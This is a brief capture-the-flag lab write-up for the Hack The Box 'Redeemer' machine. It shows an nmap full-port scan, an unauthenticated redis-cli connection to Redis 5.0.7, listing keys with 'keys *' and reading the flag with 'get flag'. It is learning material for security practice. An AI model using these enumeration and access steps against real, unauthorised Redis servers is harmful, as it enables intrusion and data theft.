# Redeemer - Hack The Box (Starting Point)

## Summary
Redeemer is an easy **Starting Point** box that introduces enumeration of the **Redis** service and demonstrates how to query a database directly to retrieve stored information, in this case the flag.

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -p- -T4 10.129.x.x (-p- to scan for all ports because first 1000 were closed, -T4 was for faster response)
                             
Result:
Nmap scan report for 10.129.x.x
Host is up (3.5s latency).
Not shown: 46678 closed tcp ports (reset), 18856 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

                             
Exploitation
Connect with redis-cli
redis-cli -h 10.129.x.x (-h for hostname)
Once connected, basic Redis commands can be used to enumerate the database. (Such as info to display information and select to slect index e.g select 0)

Enumerate keys
keys * (To display all keys)
Output:
1) "flag"
2) "temp"
3) "stor"
4) "numb"
(2.05s)

Retrieve the flag:
get flag
